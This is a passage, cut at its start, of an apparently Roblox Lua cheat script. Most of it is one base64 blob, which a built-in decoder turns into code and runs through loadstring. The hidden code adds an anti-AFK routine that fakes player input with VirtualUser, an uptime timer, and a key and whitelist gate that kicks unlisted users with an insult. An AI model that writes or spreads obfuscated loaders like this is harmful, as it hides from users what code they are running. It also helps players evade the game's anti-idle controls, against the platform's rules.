Y29uZHMsIG1pbnV0ZXMsIGhvdXJzID0gMCwgMCwgMAogICAgICAgICAgICBfRy50aW1lckFGSyA9IHRydWUKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBfRy50aW1lckFGSyBkbwogICAgICAgICAgICAgICAgICAgIHNlY29uZHMgPSBzZWNvbmRzICsgMQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgICAgIGlmIHNlY29uZHMgPj0gNjAgdGhlbiBzZWNvbmRzID0gMDsgbWludXRlcyA9IG1pbnV0ZXMgKyAxIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIG1pbnV0ZXMgPj0gNjAgdGhlbiBtaW51dGVzID0gMDsgaG91cnMgPSBob3VycyArIDEgZW5kCiAgICAgICAgICAgICAgICAgICAgVGltZXJMYWJlbC5UZXh0ID0gc3RyaW5nLmZvcm1hdCgiJTAyZDolMDJkOiUwMmQiLCBob3VycywgbWludXRlcywgc2Vjb25kcykKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBBbnRpLUFGSyBmdW5jdGlvbgogICAgICAgICAgICBsb2NhbCB2dSA9IGdhbWU6R2V0U2VydmljZSgnVmlydHVhbFVzZXInKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuSWRsZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB2dTpDYXB0dXJlQ29udHJvbGxlcigpCiAgICAgICAgICAgICAgICB2dTpDbGlja0J1dHRvbjIoVmVjdG9yMi5uZXcoKSkKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJBbnRpIEFGSyIsCiAgICAgICAgICAgICAgICBEZXNjID0gIkFudGkgQUZLIGFjdGl2YXRlZCB3aXRoIGFuaW1hdGVkIHRpbWVyISIsCiAgICAgICAgICAgICAgICBUaW1lID0gMwogICAgICAgICAgICB9KQogICAgICAgIGVsc2UKICAgICAgICAgICAgLS0gVHVybiBvZmYKICAgICAgICAgICAgX0cuZGlzcGxheUFGSyA9IGZhbHNlCiAgICAgICAgICAgIF9HLnRpbWVyQUZLID0gZmFsc2UKICAgICAgICAgICAgX0cuYW5pbWF0ZUdyYWRpZW50cyA9IGZhbHNlCiAgICAgICAgICAgIGlmIGdhbWUuQ29yZUd1aTpGaW5kRmlyc3RDaGlsZCgiQW50aUFGS0Rpc3BsYXkiKSB0aGVuCiAgICAgICAgICAgICAgICBnYW1lLkNvcmVHdWkuQW50aUFGS0Rpc3BsYXk6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIkFudGkgQUZLIiwKICAgICAgICAgICAgICAgIERlc2MgPSAiQW50aSBBRksgZGVhY3RpdmF0ZWQhIiwKICAgICAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCldpbmRvdzpOb3RpZnkoewogICAgVGl0bGUgPSAi8J+OiSBEWUxBTiBTTyBGSU5FIFNDUklQVCAtIENPTVBMRVRFISIsCiAgICBEZXNjID0gIkFsbCAxMSB0YWJzIGxvYWRlZCBzdWNjZXNzZnVsbHkhIEVuam95IHlvdXIgdWx0aW1hdGUgU2NyaXB0IfCfmoAiLAogICAgVGltZSA9IDEwCn0pCgplbHNlaWYgbm90IGlzV2hpdGVsaXN0ZWQgdGhlbgogICAgICAgIC0tIE5vdCB3aGl0ZWxpc3RlZCAtIFNIUklOSyBUTyBMT0FESU5HIEJPWAogICAgICAgIHNocmlua0ludG9Mb2FkaW5nQm94KCkKICAgICAgICAKICAgICAgICAtLSBTdGFydCBsb2FkaW5nIGFuaW1hdGlvbgogICAgICAgIGFuaW1hdGVMb2FkaW5nQmFyKCkKICAgICAgICAKICAgICAgICAtLSBXYWl0IGZvciBsb2FkaW5nIHRvIGNvbXBsZXRlCiAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgCiAgICAgICAgLS0gU2hvdyBmaW5hbCByZXN1bHQKICAgICAgICBsb2FkaW5nVGV4dC5UZXh0ID0gIuKdjCBOb3QgV2hpdGVsaXN0ZWQgLSBLaWNraW5nLi4uIgogICAgICAgIGxvYWRpbmdUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDEwMCwgMTAwKQogICAgICAgIHBlcmNlbnRhZ2VUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDEwMCwgMTAwKQogICAgICAgIAogICAgICAgIHdhaXQoMS41KQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcjpLaWNrKCJVTUFTQSBLQUJBPyBUQU5HQSBLQSBFSCIpCiAgICAgICAgCiAgICBlbHNlCiAgICAgICAgLS0gV2hpdGVsaXN0ZWQgYnV0IHdyb25nIGtleSAtIFdST05HIEtFWSBTSEFLRQogICAgICAgIHN0YXR1cy5UZXh0ID0gIuKdjCBJbnZhbGlkIGtleSEiCiAgICAgICAgc3RhdHVzLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDE1MCwgNTApCiAgICAgICAgCiAgICAgICAgLS0gQW5pbWF0ZSB3YXJuaW5nIHdpdGggc2hha2UKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpOkNyZWF0ZShzdWJtaXRCdG4sIFR3ZWVuSW5mby5uZXcoMC41KSwge0JhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDE1MCwgNTApfSk6UGxheSgpCiAgICAgICAgc2hha2VGcmFtZSgpCiAgICAgICAgCiAgICAgICAgLS0gUmVzZXQgYWZ0ZXIgMS41IHNlY29uZHMKICAgICAgICB3YWl0KDEuNSkKICAgICAgICBzdGF0dXMuVGV4dCA9ICIiCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKTpDcmVhdGUoc3VibWl0QnRuLCBUd2VlbkluZm8ubmV3KDAuNSksIHtCYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjIxLCAyNCwgMjQpfSk6UGxheSgpCiAgICBlbmQKZW5kCgotLSBDb25uZWN0IGJ1dHRvbgpzdWJtaXRCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdCh2ZXJpZnlLZXkpCgotLSBFbnRlciBrZXkgdG8gc3VibWl0CmtleUJveC5Gb2N1c0xvc3Q6Q29ubmVjdChmdW5jdGlvbihlbnRlclByZXNzZWQpCiAgICBpZiBlbnRlclByZXNzZWQgdGhlbgogICAgICAgIHZlcmlmeUtleSgpCiAgICBlbmQKZW5kKQ==" local __map={};(function() local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' for i=1,#chars do __map[string.sub(chars,i,i)]=i-1 end end)() local out={};local i=1;while i<=#__b do local c1=__map[string.sub(__b,i,i)];local c2=__map[string.sub(__b,i+1,i+1)];local c3=__map[string.sub(__b,i+2,i+2)];local c4=__map[string.sub(__b,i+3,i+3)];if not c1 then break end;c2=c2 or 0;c3=c3 or 0;c4=c4 or 0;local n=c1*262144+c2*4096+c3*64+c4;local b1=math.floor(n/65536)%256;local b2=math.floor(n/256)%256;local b3=n%256;out[#out+1]=string.char(b1);if string.sub(__b,i+2,i+2)~='=' then out[#out+1]=string.char(b2) end;if string.sub(__b,i+3,i+3)~='=' then out[#out+1]=string.char(b3) end;i=i+4 end;local decoded=table.concat(out) local ok,err=pcall(function() local loader=loadstring or load;local f=loader(decoded);if type(f)=='function'then f() end end) if not ok then pcall(function() print('Wrapper error: '..tostring(err)) end) end end)()
